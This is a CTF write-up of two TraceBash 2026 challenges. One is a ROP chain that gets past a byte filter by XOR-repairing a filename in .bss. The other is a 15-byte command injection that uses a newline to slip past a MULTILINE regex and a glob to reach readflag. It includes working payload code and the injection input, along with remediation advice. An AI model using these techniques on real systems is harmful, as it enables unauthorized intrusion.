---
title: "TraceBash CTF 2026 — solved web and pwn writeups"
ctf: "TraceBash CTF 2026"
date: 2026-06-28
category: "Competition · Web, Binary Exploitation"
tags: ["tracebash-2026", "web", "command-injection", "regex", "bash", "pwn", "stack-overflow", "rop", "badchars", "x86-64"]
excerpt: "Two TraceBash CTF 2026 solves: a letter-free 15-byte command injection and a ROP chain that rebuilds a filtered filename in .bss."
---

TraceBash CTF 2026 ran from 26 to 27 June 2026. I am keeping the two solved challenges together here: one web challenge where a newline escapes an IPv4 check, and one pwn challenge where a byte filter has to be worked around inside a ROP chain. The supplied handouts match the [official TraceBash archive](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TraceBash/2026).

The handout contains a local fixture, so the local run prints `TBCTF{dummy}`. The recorded competition result is `TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}`. I keep those two results separate below instead of pretending that the dummy string is the remote flag.

## Contents

- [Pwn](#pwn)
  - [Banned Bytes](#pwn-01-banned-bytes--a-rop-chain-around-filtered-characters)
- [Web](#web)
  - [Ping Me](#web-01-ping-me--a-15-byte-command-injection)

## Pwn

### [PWN-01] Banned Bytes — a ROP chain around filtered characters

#### What the handout gives us

The challenge is a 64-bit ELF plus `libprint.so`. The helper library exports a function equivalent to:

```c
void print_file(char *path) {
    FILE *fp = fopen(path, "r");
    if (fp == NULL) return;
    while ((c = fgetc(fp)) != EOF) putchar(c);
    fclose(fp);
}
```

So the intended end state is simple: make the program call `print_file("flag.txt")`.

The binary has the useful protection profile:

```text
Arch:        amd64
RELRO:       Partial RELRO
Stack:       No canary found
NX:          NX enabled
PIE:         No PIE
```

That tells me where to spend time. The missing canary makes the stack overwrite direct. No PIE means the gadget addresses do not move. NX rules out putting shellcode on the stack, so ROP is the natural route. The imported helper is already enough; there is no need to hunt for a shell.

#### The overflow

`vuln()` reserves `0x50` bytes and then asks `read()` for `0x200` bytes:

```asm
sub    rsp, 0x50
lea    rax, [rbp-0x50]
mov    edx, 0x200
mov    rsi, rax
mov    edi, 0
call   read@plt
```

The saved return address is eight bytes above the saved `rbp`, so the offset is:

```text
0x50 bytes of buffer + 8 bytes of saved rbp = 88 bytes
```

That gives us control of the first ROP address with `b"A" * 88`.

#### The filter and the useful gadgets

After reading the payload, the program walks over every received byte and replaces these four values with a NUL byte:

```text
0x78  x
0x67  g
0x61  a
0x2e  .
```

This is a bad-character problem, but it applies to the whole payload. It is not enough for the final filename to avoid the filter: every little-endian address and every value placed on the stack must avoid `x`, `g`, `a`, and `.` too.

The binary gives us the primitives needed for a small write-and-fix chain:

| Address | Gadget |
| ---: | --- |
| `0x401060` | `print_file@plt` |
| `0x40125b` | `pop r12; pop r13; pop r14; pop r15; ret` |
| `0x401264` | `pop r14; pop r15; ret` |
| `0x401269` | `mov qword ptr [r13], r12; ret` |
| `0x40126e` | `xor byte ptr [r15], r14b; ret` |
| `0x401272` | `pop rdi; ret` |
| `0x401274` | `ret` |

`writebuf` is at `0x404060` in `.bss`, which is writable and has a fixed address because PIE is disabled.

#### Writing a safe filename

The intended filename is eight bytes long:

```text
flag.txt
```

The banned positions are 2, 3, 4, and 6 (zero-indexed): `a`, `g`, `.`, and `x`. I encode only those bytes with XOR key `2`:

| Offset | Desired byte | Sent to `.bss` |
| ---: | :---: | :---: |
| 2 | `a` | `c` |
| 3 | `g` | `e` |
| 4 | `.` | `,` |
| 6 | `x` | `z` |

The qword written by the first ROP stage is therefore:

```text
flce,tzt
```

The chain later XORs offsets 2, 3, 4, and 6 with `2`, turning the string back into `flag.txt` in memory. This is less work than encoding the whole payload, and it keeps the intent visible when reading the solver.

One small detail matters here: the helper is called with `flag.txt`, not `/flag.txt`. The service starts in `/home/ctf`, where the handout's flag file lives. Trying to “improve” the path by adding a leading slash points at a different file.

#### The ROP chain

The chain has four stages:

1. Skip the 88-byte stack frame and enter the write gadget.
2. Store `flce,tzt` at `writebuf`.
3. Use the byte-wise XOR gadget four times.
4. Put `writebuf` in `rdi` and call `print_file@plt`.

The core construction is:

```python
payload = b"A" * 88

# write the encoded eight-byte filename into .bss
payload += p64(POP_R12_R13_R14_R15)
payload += p64(int.from_bytes(b"flce,tzt", "little"))
payload += p64(WRITEBUF)
payload += p64(0)                 # r14, unused by this gadget
payload += p64(0)                 # r15, unused by this gadget
payload += p64(MOV_QWORD_PTR_R13_R12)

# repair the four bytes changed by the input filter
for offset in (2, 3, 4, 6):
    payload += p64(POP_R14_R15)
    payload += p64(2)
    payload += p64(WRITEBUF + offset)
    payload += p64(XOR_BYTE_PTR_R15_R14B)

# print_file(writebuf)
payload += p64(POP_RDI)
payload += p64(WRITEBUF)
payload += p64(RET)               # keep the libc call aligned
payload += p64(PRINT_FILE_PLT)
payload += p64(MAIN)
```

The raw payload is 304 bytes long, and a byte check confirms that it contains none of the four filtered characters. The extra `ret` before the PLT call is the usual x86-64 stack-alignment fix. Without it, the chain can reach the library function with the wrong stack alignment and fail in code that uses aligned instructions.

The call to `main` after `print_file` is not needed to read the flag. It just gives the local process a normal-looking return path after the output. The process may still be terminated by the surrounding wrapper afterwards; the flag has already been printed.

The complete solver is available as [`tracebash-banned-bytes/solve.py`](/solvers/tracebash-banned-bytes/solve.py).

#### The PTY detail

There is a second issue that is easy to miss. The container does not expose `vuln` directly. It runs:

```text
socat TCP-LISTEN:1338,reuseaddr,fork EXEC:/home/ctf/run.sh,pty,stderr
```

The `pty` creates a terminal line discipline between the socket and the process. Raw ROP bytes such as `0x12` and `0x00` are not all ordinary input to a terminal: some are control characters, and they can be consumed or echoed in a way that changes the payload.

For the network version, the solver prefixes control bytes with the terminal's literal-next character, `Ctrl-V` (`0x16`). The PTY removes the quote and forwards the following byte. The bytes seen by `vuln` are then the original 304-byte payload, while the wire representation is longer because of the quoting.

This is why a payload can work when piped directly to the ELF and still fail against the TCP service. The ROP chain is the same; the transport is not.

#### Local reproduction

The handout can be run locally with Docker. A direct raw run is enough to check the chain:

```sh
cd handout
python3 /path/to/solve.py --payload | \
  LD_LIBRARY_PATH=. ./vuln
```

The output from the supplied fixture is:

```text
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
TBCTF{dummy}
```

I also ran the same chain through the supplied `socat`/PTY wrapper. The wrapper echoed the quoted bytes, the binary applied its filter, and the process still printed `TBCTF{dummy}`. That checks the part of the solver that is otherwise easy to hand-wave away.

#### What the blacklist actually changes

The blacklist makes a direct `flag.txt` payload fail, but it does not repair the vulnerability. The attacker already has a return-address overwrite and a gadget that can write a qword to memory. A byte-wise XOR gadget is enough to rebuild the forbidden characters after the filter has finished.

The real fix is much less clever: bound the read to the size of the destination buffer, keep file-printing helpers away from attacker-controlled paths, and compile with hardening enabled. Filtering a few bytes after an unchecked `read()` only turns a straightforward ROP chain into a slightly more interesting one.

#### Banned Bytes flag provenance

- **Local handout:** `TBCTF{dummy}` — confirmed by running the solver against the supplied Docker bundle.
- **Competition result:** `TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}` — the recorded TraceBash result for this challenge.

## Web

### [WEB-01] Ping Me — a 15-byte command injection

This challenge looks like a tiny network utility with a very opinionated input box: fifteen characters, no letters, digits and dots only. The page even flashes a warning when a letter is typed. That made the first step easy to guess: the interesting part was not the frontend, but the small Flask endpoint behind it.

I rebuilt the supplied service locally. The payload works against the Docker copy and returns the local fixture `TBCTF{dummy}`. The recorded competition result is `TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}`.

#### The endpoint

The useful route reads the entire request body and drops it into a shell command:

```python
ip = request.get_data(as_text=True)
command = f"ping -c 1 -W 2 {ip}"

output = subprocess.check_output(
    command,
    shell=True,
    executable="/bin/bash",
    stderr=subprocess.STDOUT,
    timeout=5,
)
```

At this point the challenge is already a command-injection problem. The filters are just the puzzle around it:

```python
if len(ip) > 15:
    reject()
if any(c.isalpha() for c in ip):
    reject()
if "$" in ip:
    reject()
if not re.match(r"^[\d.]+$", ip, flags=re.MULTILINE):
    reject()
if "./" in unicodedata.normalize("NFKC", ip):
    reject()
```

The page says “IPv4”, but the backend never parses an IPv4 address. It checks a string and then gives that string to Bash. Those are very different guarantees.

#### The regex is only checking the first line

The useful bug is the combination of `re.match()` and `re.MULTILINE`.

`re.match()` starts matching at offset zero, but it does not mean “consume the entire string.” The `$` in the pattern normally means the end of the string. With `MULTILINE`, it also matches just before a newline. Therefore this input passes the regex:

```text
1
/???/????????
```

The first line is simply `1`, which is made only of an allowed digit. The regex can stop at the newline, and `re.match()` is satisfied. The rest of the body is still present in `ip`; it was not removed by validation.

The difference is easy to see in a small Python check:

```python
import re

payload = "1\n/???/????????"
assert re.match(r"^[\d.]+$", payload, flags=re.MULTILINE)
assert not re.fullmatch(r"[\d.]+", payload)
```

The first assertion is the challenge's validation. The second is what a whole-string check would have done.

The other filters do not stop this payload:

- It is exactly 15 bytes long.
- `1`, `/`, `?`, and the newline are not letters.
- There is no `$`.
- There is no literal `./`.

#### Finding a command without typing a command

The newline gives us a second shell command, but the letter filter means we cannot type `cat`, `readflag`, or even a normal path. Bash globbing supplies the missing characters.

The `?` wildcard means “one character.” It does not contain the letters it eventually matches. The string `/???/????????` therefore describes an absolute path with a three-character directory and an eight-character filename.

The handout runs from `/app`. In that image:

- `/app` is a three-character directory and sorts before the other matching root directories.
- `/app/readflag` is an eight-character filename.
- `readflag` prints the inherited `FLAG` environment variable.

Bash expands the glob before it starts the command. The first expanded word is `/app/readflag`, so that becomes the command. Other matches, if present, are passed as extra arguments; `readflag` ignores them.

This is the part I like about the challenge. The filter tries to ban command names, but the shell does not need the command name to be present literally. It only needs a pattern that resolves to one.

#### The 15-byte payload

The final input is:

```text
1\n/???/????????
```

Counting the bytes:

```text
1          1 byte
newline    1 byte
/???       4 bytes
/????????  9 bytes
----------------
           15 bytes
```

After interpolation, Bash sees two commands:

```sh
ping -c 1 -W 2 1
/???/????????
```

The first command is harmless. `ping` accepts the one-component numeric address `1` as `0.0.0.1`, so it produces the normal ping output. The second command expands to `/app/readflag`, which prints the flag. Because the Flask handler captures stdout and stderr together, both pieces arrive in the JSON response.

#### Local reproduction

I built the supplied service rather than trusting the static explanation:

```sh
cd web/ping-me/handout/ping_me
docker compose up -d --build
```

Then I sent the body directly to the local API:

```python
import json
import urllib.request

body = b"1\n/???/????????"
request = urllib.request.Request(
    "http://127.0.0.1:5030/api/ping",
    data=body,
    headers={"Content-Type": "text/plain"},
    method="POST",
)

with urllib.request.urlopen(request) as response:
    result = json.loads(response.read())

print(result["output"])
```

The important part of the local response was:

```text
--- 1 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss

TBCTF{dummy}
```

That confirms the complete chain: the newline survives validation, Bash starts a second command, the glob reaches `/app/readflag`, and the child process inherits `FLAG`.

#### Solver

The small solver is [`tracebash-ping-me/solve.py`](/solvers/tracebash-ping-me/solve.py). It takes the base URL as an argument so it is useful with the local Docker service without baking a competition endpoint into the page:

```sh
python3 solve.py http://127.0.0.1:5030
```

The solver asserts the 15-byte length before sending anything. That check is worth keeping: adding one more character makes the filter reject the request, and replacing `?` with a literal letter makes the endpoint reject it even earlier.

#### Why the fix is not another filter

The direct fix is to stop treating user input as shell syntax:

```python
subprocess.run(
    ["ping", "-c", "1", "-W", "2", ip],
    check=True,
    capture_output=True,
    text=True,
)
```

If the application really needs to accept an address, parse it with `ipaddress.ip_address()` and pass the resulting value as an argument. `re.fullmatch()` would also close this particular newline trick, but it would still leave `shell=True` as the larger problem.

The challenge's filters each react to one obvious payload shape: letters, `$`, `./`, and long input. The shell is still in charge of interpreting the value. That is why every local rule can look reasonable while the endpoint remains exploitable.

#### Ping Me flag provenance

- **Local handout:** `TBCTF{dummy}` — confirmed by running the Docker service and the 15-byte payload.
- **Competition result:** `TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}` — the recorded TraceBash result for this challenge.

